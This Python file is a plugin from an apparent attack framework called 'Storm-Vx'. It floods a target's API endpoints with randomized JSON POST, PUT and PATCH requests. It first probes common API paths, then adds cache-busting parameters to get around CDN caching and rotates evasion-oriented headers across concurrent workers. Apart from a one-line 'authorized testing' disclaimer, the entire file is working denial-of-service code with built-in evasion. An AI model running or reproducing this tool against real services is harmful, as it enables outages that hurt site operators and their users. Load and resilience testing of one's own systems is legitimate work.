#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_basic_api_flood — Basic API Flood Attack Plugin (v24 P0)

Sends rapid POST requests with JSON payloads to API endpoints.
v24: Enhanced with smart header rotation via evasion manager,
adaptive backoff, and diverse API endpoint targeting.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import json
from typing import Dict, Any, List
from urllib.parse import urlparse


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import C, rand_str, rand_cache_bust
from utils.session_helpers import attack_timeout
from config.defaults import ATTACK_QUICK_TIMEOUT, DEFAULT_KEEPALIVE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)

import aiohttp


__all__ = ["BasicApiFloodPlugin"]


# v24: Common API endpoint patterns to probe
API_ENDPOINTS = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/auth/login", "/api/auth/register", "/api/auth/refresh",
    "/api/user", "/api/users", "/api/profile",
    "/api/data", "/api/config", "/api/settings",
    "/api/search", "/api/query",
    "/graphql", "/graphiql",
    "/rest", "/rest/v1",
    "/v1", "/v2",
    "/json", "/ajax",
]


class BasicApiFloodPlugin(AttackPlugin):
    """Flood API endpoints with JSON POST requests (v24: smart targeting).

    v24: Discovers API endpoints from profile, probes common paths,
    and uses evasion-aware headers for each request. Includes adaptive
    backoff to avoid wasting resources on blocked endpoints.
    """

    meta = PluginMeta(
        name='basic_api_flood',
        version='2.0.0',
        plugin_type='attack',
        description='API flood — POST with JSON payloads to discovered API endpoints',
        tags=['http', 'api', 'json', 'flood', 'smart'],
        priority=25,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def __init__(self) -> None:
        super().__init__()
        self._api_endpoints: List[str] = []
        # BUG-FIX v33: Use asyncio.Event instead of bool for proper worker
        # synchronization (same fix as vf_login_flood.py).
        self._probe_done: asyncio.Event = asyncio.Event()

    async def _discover_api_endpoints(self, context: AttackContext) -> List[str]:
        """v24: Discover API endpoints from profile and probing."""
        _ssl = context.ssl_param

        discovered: List[str] = []
        site_root = context.site_root

        # Phase 1: Use profile endpoints
        profile = context.profile
        api_endpoints = profile.api_endpoints if profile else []
        for ep in api_endpoints:
            if ep.startswith('/'):
                discovered.append(f"{site_root}{ep}")
            elif ep.startswith(site_root):
                discovered.append(ep)

        # Phase 2: Probe common API paths
        for path in random.sample(API_ENDPOINTS, min(10, len(API_ENDPOINTS))):
            url = f"{site_root}{path}"
            try:
                headers = dict(context.headers)
                async with context.session.get(url, headers=headers,
                                               ssl=_ssl, allow_redirects=False,
                                               timeout=attack_timeout(total=ATTACK_QUICK_TIMEOUT)) as resp:  # W2.4
                    if resp.status not in (404, 0):
                        discovered.append(url)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"API path probe failed for {url}: {exc}")

        # Fallback
        if not discovered:
            discovered = context.page_targets or [context.url]
            print(f"  {C.Y}[API-FLOOD] No API endpoints found, using base pages{C.RS}")
        else:
            discovered = list(dict.fromkeys(discovered))
            print(f"  {C.G}[API-FLOOD] Discovered {len(discovered)} API endpoints{C.RS}")

        return discovered

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """API flood worker: POST with JSON payloads."""
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        delay_ms = context.extra.delay_ms

        # BUG-FIX v33: Use asyncio.Event.wait() for proper synchronization.
        if worker_id == 0 and not self._probe_done.is_set():
            self._api_endpoints = await self._discover_api_endpoints(context)
            self._probe_done.set()
        elif not self._probe_done.is_set():
            try:
                await asyncio.wait_for(self._probe_done.wait(), timeout=float(DEFAULT_KEEPALIVE_TIMEOUT))  # W2.4
            except asyncio.TimeoutError:
                logger.warning(f"Worker {worker_id}: API discovery timeout, using base pages")

        targets = self._api_endpoints if self._api_endpoints else pages

        while not self._stop_event.is_set():
            try:
                url = random.choice(targets)

                # v24: Add cache buster to avoid CDN caching
                if random.random() > 0.3:
                    url += f"{'&' if '?' in url else '?'}{rand_cache_bust()}"

                # v24: Get fresh headers with API-specific fingerprint
                headers = self._get_fresh_headers(context, "api")
                headers["Content-Type"] = "application/json"

                # v24: Diverse payload types
                payload_type = random.random()
                if payload_type < 0.3:
                    payload = json.dumps({"query": rand_str(20), "id": rand_str(8)})
                elif payload_type < 0.5:
                    payload = json.dumps({"username": rand_str(8), "password": rand_str(12)})
                elif payload_type < 0.7:
                    payload = json.dumps({"action": "search", "q": rand_str(15), "page": random.randint(1, 100)})
                else:
                    payload = json.dumps({"data": rand_str(30), "type": random.choice(["create", "update", "delete"])})

                t = time.time()
                try:
                    # v24: Mix of HTTP methods for diversity
                    method = random.choices(["POST", "PUT", "PATCH"], weights=[60, 20, 20], k=1)[0]
                    async with context.session.request(method, url, headers=headers,
                                                       data=payload,
                                                       ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.time() - t
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                        ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                        self._capture_response_cookies(resp, context)
                        await self._record("API", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    self._on_request_result(worker_id, False)
                    await self._record("API", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                # v24: Adaptive sleep with backoff
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("API", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)


